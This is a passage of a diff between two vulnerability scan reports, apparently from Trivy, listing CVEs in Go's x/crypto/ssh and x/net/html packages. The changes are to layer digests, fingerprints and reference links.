+│     │      │                  ├ [67]: https://ubuntu.com/security/notices/USN-8447-2 
+│     │      │                  ├ [68]: https://ubuntu.com/security/notices/USN-8447-3 
+│     │      │                  ╰ [69]: https://www.cve.org/CVERecord?id=CVE-2026-39830 
 │     │      ├ PublishedDate   : 2026-05-22T04:16:22.44Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:17.083Z 
 │     ├ [14] ╭ VulnerabilityID : CVE-2026-39831 
@@ -6393,13 +5984,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39831 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:dba8c4085e24360f310703809b25b64fd9384ae89caaa5624d29d6748b2d38f9 
+│     │      ├ Fingerprint     : sha256:fca7054372c36ba53333df3a9c52612cc44fb9614f14fb84999e33c95b52abdc 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Security key bypass due to
 │     │      │                   missing user presence check 
 │     │      ├ Description     : The Verify() method for FIDO/U2F security key types
@@ -6437,13 +6028,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39832 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:f0c31eeef5e4235665e47d3c308da852d3524be901b5d41b9551539b17115b33 
+│     │      ├ Fingerprint     : sha256:7a8b53937df93a487a5e229e505295ee4614070407b0fb3c8077d7a01a08b3a5 
 │     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang.org/x/crypto/ssh/agent: Security bypass
 │     │      │                   due to improper handling of key restrictions 
 │     │      ├ Description     : When adding a key to a remote agent constraint extensions such as
@@ -6492,26 +6083,28 @@
 │     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:43692 
 │     │      │                  ├ [25]: https://access.redhat.com/security/cve/CVE-2026-39832 
 │     │      │                  ├ [26]: https://bugzilla.redhat.com/2480680 
-│     │      │                  ├ [27]: https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [28]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [29]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [30]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [31]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [32]: https://errata.almalinux.org/9/ALSA-2026-37410.html 
-│     │      │                  ├ [33]: https://errata.rockylinux.org/RLSA-2026:37410 
-│     │      │                  ├ [34]: https://github.com/golang/crypto/commit/e3d1254f1e7e60baa086142c46174bf
+│     │      │                  ├ [27]: https://bugzilla.redhat.com/2480681 
+│     │      │                  ├ [28]: https://bugzilla.redhat.com/2480684 
+│     │      │                  ├ [29]: https://bugzilla.redhat.com/2480685 
+│     │      │                  ├ [30]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [31]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [32]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [33]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [34]: https://errata.almalinux.org/10/ALSA-2026-36199.html 
+│     │      │                  ├ [35]: https://errata.rockylinux.org/RLSA-2026:37410 
+│     │      │                  ├ [36]: https://github.com/golang/crypto/commit/e3d1254f1e7e60baa086142c46174bf
 │     │      │                  │       6d8d0fe50 
-│     │      │                  ├ [35]: https://go.dev/cl/778642 
-│     │      │                  ├ [36]: https://go.dev/issue/79435 
-│     │      │                  ├ [37]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
-│     │      │                  ├ [38]: https://linux.oracle.com/cve/CVE-2026-39832.html 
-│     │      │                  ├ [39]: https://linux.oracle.com/errata/ELSA-2026-37410.html 
-│     │      │                  ├ [40]: https://nvd.nist.gov/vuln/detail/CVE-2026-39832 
-│     │      │                  ├ [41]: https://pkg.go.dev/vuln/GO-2026-5006 
-│     │      │                  ├ [42]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39832
+│     │      │                  ├ [37]: https://go.dev/cl/778642 
+│     │      │                  ├ [38]: https://go.dev/issue/79435 
+│     │      │                  ├ [39]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
+│     │      │                  ├ [40]: https://linux.oracle.com/cve/CVE-2026-39832.html 
+│     │      │                  ├ [41]: https://linux.oracle.com/errata/ELSA-2026-37410.html 
+│     │      │                  ├ [42]: https://nvd.nist.gov/vuln/detail/CVE-2026-39832 
+│     │      │                  ├ [43]: https://pkg.go.dev/vuln/GO-2026-5006 
+│     │      │                  ├ [44]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39832
 │     │      │                  │       .json 
-│     │      │                  ├ [43]: https://ubuntu.com/security/notices/USN-8447-1 
-│     │      │                  ╰ [44]: https://www.cve.org/CVERecord?id=CVE-2026-39832 
+│     │      │                  ├ [45]: https://ubuntu.com/security/notices/USN-8447-1 
+│     │      │                  ╰ [46]: https://www.cve.org/CVERecord?id=CVE-2026-39832 
 │     │      ├ PublishedDate   : 2026-05-22T04:16:22.663Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:19.1Z 
 │     ├ [16] ╭ VulnerabilityID : CVE-2026-39835 
@@ -6523,13 +6116,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39835 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:0ae3d4d14a7a7b39d3f2e89d59e9b1926588751c4e930fc47626647570165828 
+│     │      ├ Fingerprint     : sha256:3e8ddeb838f1180617b847d50991b34d5af9171e78569995f9557a60f48d51cb 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
 │     │      │                   via crafted SSH certificate 
 │     │      ├ Description     : SSH servers which use CertChecker as a public key callback without setting
@@ -6587,23 +6180,25 @@
 │     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:48151 
 │     │      │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-39835 
 │     │      │                  ├ [39]: https://bugzilla.redhat.com/2480680 
-│     │      │                  ├ [40]: https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-37410.html 
-│     │      │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:37410 
-│     │      │                  ├ [47]: https://go.dev/cl/781660 
-│     │      │                  ├ [48]: https://go.dev/issue/79563 
-│     │      │                  ├ [49]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
-│     │      │                  ├ [50]: https://linux.oracle.com/cve/CVE-2026-39835.html 
-│     │      │                  ├ [51]: https://linux.oracle.com/errata/ELSA-2026-38504.html 
-│     │      │                  ├ [52]: https://nvd.nist.gov/vuln/detail/CVE-2026-39835 
-│     │      │                  ├ [53]: https://pkg.go.dev/vuln/GO-2026-5015 
-│     │      │                  ├ [54]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39835
+│     │      │                  ├ [40]: https://bugzilla.redhat.com/2480681 
+│     │      │                  ├ [41]: https://bugzilla.redhat.com/2480684 
+│     │      │                  ├ [42]: https://bugzilla.redhat.com/2480685 
+│     │      │                  ├ [43]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [44]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [45]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [46]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [47]: https://errata.almalinux.org/10/ALSA-2026-36199.html 
+│     │      │                  ├ [48]: https://errata.rockylinux.org/RLSA-2026:37410 
+│     │      │                  ├ [49]: https://go.dev/cl/781660 
+│     │      │                  ├ [50]: https://go.dev/issue/79563 
+│     │      │                  ├ [51]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
+│     │      │                  ├ [52]: https://linux.oracle.com/cve/CVE-2026-39835.html 
+│     │      │                  ├ [53]: https://linux.oracle.com/errata/ELSA-2026-38504.html 
+│     │      │                  ├ [54]: https://nvd.nist.gov/vuln/detail/CVE-2026-39835 
+│     │      │                  ├ [55]: https://pkg.go.dev/vuln/GO-2026-5015 
+│     │      │                  ├ [56]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39835
 │     │      │                  │       .json 
-│     │      │                  ╰ [55]: https://www.cve.org/CVERecord?id=CVE-2026-39835 
+│     │      │                  ╰ [57]: https://www.cve.org/CVERecord?id=CVE-2026-39835 
 │     │      ├ PublishedDate   : 2026-05-22T04:16:24.53Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:28.127Z 
 │     ├ [17] ╭ VulnerabilityID : CVE-2026-42508 
@@ -6615,13 +6210,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42508 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:1387a7e5eb52e9fd5ebd435c12239a28a8ba53610aa43260e3e7c70c6ba4b0c9 
+│     │      ├ Fingerprint     : sha256:bd5d71320817ff1907d99da9063114df36c3d50e1ffd9b0e3cd1d2483a966621 
 │     │      ├ Title           : golang.org/x/crypto/ssh/knownhosts: golang:
 │     │      │                   golang.org/x/crypto/ssh/knownhosts: Revocation bypass via unchecked
 │     │      │                   SignatureKey 
@@ -6716,13 +6311,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46595 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:54016784cf7440707a2a2cf8608d4efe408b564edaa04d027acf0fbcf370c0bc 
+│     │      ├ Fingerprint     : sha256:1fcf281c1b417367301919b5559a4389758ac2b169d6ee16fa42240d982c3001 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Authorization bypass due to
 │     │      │                   skipped source-address validation 
 │     │      ├ Description     : Previously, CVE-2024-45337 fixed an authorization bypass for misused ssh
@@ -6786,13 +6381,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46597 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:c404802dbd57eda837a3ffcc4daa9187f9dbe8973779852aaa99da21849d5db4 
+│     │      ├ Fingerprint     : sha256:801010b8cabc07529a86a58abe4697aedf6be51b0fd3adf694851bb13acc6b5a 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
 │     │      │                   crafted AES-GCM packet decoder inputs 
 │     │      ├ Description     : An incorrectly placed cast from bytes to int allowed for server-side panic in
@@ -6822,13 +6417,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39827 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:358d23f5f147ae55e99e572805610bfd3da6f31b57724dc1f346e6b9aa494e88 
+│     │      ├ Fingerprint     : sha256:643a48e3674418e9bd805d8cab90a1b2f8d2a417e097065798922a63c9fc63a3 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
 │     │      │                   via repeated rejected channel openings 
 │     │      ├ Description     : An authenticated SSH client that repeatedly opened channels which were
@@ -6861,13 +6456,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39833 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:44d8ce04a252b8fd25d01ba398a1ccc7e179b0775101ea9dddee81958c9546be 
+│     │      ├ Fingerprint     : sha256:74ab60553fdb304d0e9a1008a8c717697849ebc68a8d7a18f299725b9b9ad7ef 
 │     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang.org/x/crypto/ssh/agent: Security bypass
 │     │      │                   due to unenforced key confirmation 
 │     │      ├ Description     : The in-memory keyring returned by NewKeyring() silently accepted keys with the
@@ -6906,13 +6501,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39834 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:2b0d32dadfd7992876e5cee49eba94e130bcc655857bf9f834083ff4c9391af1 
+│     │      ├ Fingerprint     : sha256:cef89fbcb6a2776809c7e2cbc2d95794ed4020c65d8e7cf93793c8804d2ec146 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
 │     │      │                   due to integer overflow in SSH channel write 
 │     │      ├ Description     : When writing data larger than 4GB in a single Write call on an SSH channel, an
@@ -6950,13 +6545,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46598 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:26e27dc1f5f93f0e83fdf3170f19e26d6094aee811d4c58494a7697ae60f39b3 
+│     │      ├ Fingerprint     : sha256:16869c01a9d57f8fe458fbb5388c977ecb68dcc4121d1f88610edd096894fd06 
 │     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang: golang.org/x/crypto/ssh/agent: Denial
 │     │      │                   of Service via malformed input 
 │     │      ├ Description     : For certain crafted inputs, a 'ed25519.PrivateKey' was created by casting
@@ -6984,12 +6579,12 @@
 │     │      │                  ╰ UID : 21d8a1373272a6c 
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:de8210389166b1ade68c46018a26748d027fbc532c72a5ab38c6cb48820856e4 
+│     │      ├ Fingerprint     : sha256:7347790c8a7dd1de9499a76ceb342a54c17741d8d2c6d006cca930824aec2fc4 
 │     │      ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
 │     │      │                    has known security issues 
 │     │      ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous
@@ -7010,13 +6605,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:0b86bb69908f733766d0428fee9bd35ea4173e512822bf9ac37188e38097978e 
+│     │      ├ Fingerprint     : sha256:4ae4c3935a099ba65798105c6545c8a40ca662d01139739c0b969b31b9330b37 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
 │     │      │                   Cross-Site Scripting 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -7032,39 +6627,38 @@
 │     │      │                  ╰ rocky      : 3 
 │     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
 │     │      │                           ╰ V3Score : 8.1 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:34357 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
-│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
-│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
-│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
-│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
-│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
-│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
-│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
-│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
-│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
-│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
-│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
-│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
-│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
-│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
-│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
-│     │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
-│     │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
-│     │      │                  ├ [25]: https://go.dev/cl/781703 
-│     │      │                  ├ [26]: https://go.dev/issue/79574 
-│     │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-25681.html 
-│     │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
-│     │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
-│     │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5029 
-│     │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
+│     │      │                  ├ [2] : https://bugzilla.redhat.com/2466505 
+│     │      │                  ├ [3] : https://bugzilla.redhat.com/2466507 
+│     │      │                  ├ [4] : https://bugzilla.redhat.com/2467822 
+│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480756 
+│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480761 
+│     │      │                  ├ [7] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
+│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
+│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
+│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
+│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
+│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
+│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
+│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
+│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
+│     │      │                  ├ [22]: https://errata.almalinux.org/10/ALSA-2026-34357.html 
+│     │      │                  ├ [23]: https://errata.rockylinux.org/RLSA-2026:37123 
+│     │      │                  ├ [24]: https://go.dev/cl/781703 
+│     │      │                  ├ [25]: https://go.dev/issue/79574 
+│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
